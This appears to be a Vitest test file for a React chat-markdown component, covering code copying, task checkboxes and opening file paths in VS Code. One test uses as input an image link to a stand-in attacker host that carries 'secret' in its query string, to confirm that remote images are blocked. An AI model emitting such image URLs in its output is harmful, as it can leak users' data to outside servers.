import React from 'react';
import { describe, it, expect, vi, beforeEach } from 'vitest';
import { renderToStaticMarkup } from 'react-dom/server';
import { fireEvent, render, screen } from '@testing-library/react';
import {
  ChatMarkdown,
  ChatFileContext,
  wholeFilePath,
} from '../components/AgentsView/Chat/ChatMarkdown';

// Hoisted above the imports; the factory reads `openFile` only when called
const openFile = vi.fn();
vi.mock('../utils/openFile', () => ({ openFile: (...args: unknown[]) => openFile(...args) }));

const inSession = (text: string) => (
  <ChatFileContext.Provider value="/w/app">
    <ChatMarkdown text={text} />
  </ChatFileContext.Provider>
);

beforeEach(() => openFile.mockClear());

describe('ChatMarkdown', () => {
  it('never loads remote images (no exfiltration via image URLs)', () => {
    const html = renderToStaticMarkup(
      <ChatMarkdown text={'![logo](https://evil.example/?q=secret) and <img src="https://x">'} />
    );
    expect(html).not.toContain('<img');
    expect(html).toContain('[image: logo]');
  });

  it('labels fenced code with its language and copies the code', async () => {
    const writeText = vi.fn().mockResolvedValue(undefined);
    Object.assign(navigator, { clipboard: { writeText } });
    render(<ChatMarkdown text={'```ts\nconst a = 1;\n```'} />);
    expect(screen.getByText('ts')).toBeTruthy();
    fireEvent.click(screen.getByRole('button', { name: 'Copy' }));
    expect(writeText).toHaveBeenCalledWith('const a = 1;');
    expect(await screen.findByRole('button', { name: 'Copied' })).toBeTruthy();
  });

  it('renders task lists as read-only checkboxes', () => {
    render(<ChatMarkdown text={'- [x] done\n- [ ] open'} />);
    const boxes = screen.getAllByRole('checkbox') as HTMLInputElement[];
    expect(boxes.map((b) => [b.checked, b.disabled])).toEqual([
      [true, true],
      [false, true],
    ]);
  });

  it('opens an inline-code file path in VS Code on Cmd/Ctrl-click only', () => {
    render(inSession('See `src/app.ts:12` and `npm test`.'));
    const code = screen.getByText('src/app.ts:12');
    fireEvent.click(code);
    expect(openFile).not.toHaveBeenCalled();
    fireEvent.click(code, { metaKey: true });
    expect(openFile).toHaveBeenCalledWith('src/app.ts', '/w/app', {
      editor: true,
      line: 12,
      col: undefined,
    });
    // not a path: plain code
    expect(screen.getByText('npm test').getAttribute('title')).toBeNull();
  });

  it('opens a link to a file path in VS Code, web links in a new tab', () => {
    render(inSession('[plan](docs/plan.md) and [site](https://example.com)'));
    fireEvent.click(screen.getByText('plan'));
    expect(openFile).toHaveBeenCalledWith(
      'docs/plan.md',
      '/w/app',
      expect.objectContaining({ editor: true })
    );
    expect(screen.getByText('site').getAttribute('target')).toBe('_blank');
  });

  it('leaves paths plain without a session directory', () => {
    render(<ChatMarkdown text={'`src/app.ts`'} />);
    fireEvent.click(screen.getByText('src/app.ts'), { metaKey: true });
    expect(openFile).not.toHaveBeenCalled();
  });

  it('wholeFilePath accepts only text that is one path', () => {
    expect(wholeFilePath('/abs/x.md')?.path).toBe('/abs/x.md');
    expect(wholeFilePath('a.ts and b.ts')).toBeNull();
    expect(wholeFilePath('and/or')).toBeNull();
  });
});
